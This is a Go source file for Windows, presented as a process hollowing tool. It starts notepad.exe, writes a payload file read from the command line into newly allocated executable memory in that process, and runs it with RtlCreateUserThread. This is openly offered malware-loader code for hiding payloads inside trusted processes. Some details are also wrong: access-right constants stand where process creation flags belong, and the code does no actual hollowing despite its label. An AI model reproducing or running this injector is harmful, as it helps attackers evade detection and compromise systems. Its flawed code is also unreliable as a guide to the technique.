package main

import (
    "fmt"
    "os"
    "syscall"
    "unsafe"
)

const (
    PROCESS_CREATE_THREAD       = 0x0002
    PROCESS_QUERY_INFORMATION   = 0x0400
    PROCESS_VM_OPERATION        = 0x0008
    PROCESS_VM_WRITE            = 0x0020
    PROCESS_VM_READ             = 0x0010
    MEM_COMMIT                  = 0x1000
    MEM_RESERVE                 = 0x2000
    PAGE_EXECUTE_READWRITE      = 0x40
)

var (
    kernel32             = syscall.NewLazyDLL("kernel32.dll")
    ntdll                = syscall.NewLazyDLL("ntdll.dll")
    createProcessA       = kernel32.NewProc("CreateProcessA")
    writeProcessMemory   = kernel32.NewProc("WriteProcessMemory")
    virtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
    resumeThread         = kernel32.NewProc("ResumeThread")
    rtlCreateUserThread  = ntdll.NewProc("RtlCreateUserThread")
)

func main() {
    if len(os.Args) != 2 {
        fmt.Printf("Usage: %s <payload>\n", os.Args[0])
        os.Exit(1)
    }

    payload := os.Args[1]
    targetProcess := "C:\\Windows\\System32\\notepad.exe" // Target process to hollow

    si := new(syscall.StartupInfo)
    pi := new(syscall.ProcessInformation)

    err := createProcess(targetProcess, si, pi)
    if err != nil {
        fmt.Println("Error creating process:", err)
        return
    }

    payloadData, err := os.ReadFile(payload)
    if err != nil {
        fmt.Println("Error reading payload:", err)
        return
    }

    remoteAddr, err := virtualAlloc(pi.Process, len(payloadData))
    if err != nil {
        fmt.Println("Error allocating memory:", err)
        return
    }

    err = writeMemory(pi.Process, remoteAddr, payloadData)
    if err != nil {
        fmt.Println("Error writing memory:", err)
        return
    }

    err = injectCode(pi.Process, pi.Thread, remoteAddr)
    if err != nil {
        fmt.Println("Error injecting code:", err)
        return
    }

    fmt.Println("Process hollowing successful.")
}

func createProcess(target string, si *syscall.StartupInfo, pi *syscall.ProcessInformation) error {
    r1, _, e1 := createProcessA.Call(
        uintptr(unsafe.Pointer(syscall.StringBytePtr(target))),
        uintptr(unsafe.Pointer(syscall.StringBytePtr(""))),
        0,
        0,
        0,
        PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
        0,
        0,
        uintptr(unsafe.Pointer(si)),
        uintptr(unsafe.Pointer(pi)),
    )
    if r1 == 0 {
        return e1
    }
    return nil
}

func virtualAlloc(hProcess syscall.Handle, size int) (uintptr, error) {
    r1, _, e1 := virtualAllocEx.Call(
        uintptr(hProcess),
        0,
        uintptr(size),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if r1 == 0 {
        return 0, e1
    }
    return r1, nil
}

func writeMemory(hProcess syscall.Handle, addr uintptr, data []byte) error {
    var written uintptr
    r1, _, e1 := writeProcessMemory.Call(
        uintptr(hProcess),
        addr,
        uintptr(unsafe.Pointer(&data[0])),
        uintptr(len(data)),
        uintptr(unsafe.Pointer(&written)),
    )
    if r1 == 0 {
        return e1
    }
    return nil
}

func injectCode(hProcess syscall.Handle, hThread syscall.Handle, addr uintptr) error {
    var tHandle syscall.Handle
    r1, _, e1 := rtlCreateUserThread.Call(
        uintptr(hProcess),
        0,
        0,
        0,
        0,
        0,
        addr,
        0,
        uintptr(unsafe.Pointer(&tHandle)),
        0,
    )
    if r1 != 0 {
        return e1
    }
    resumeThread.Call(uintptr(hThread))
    return nil
}
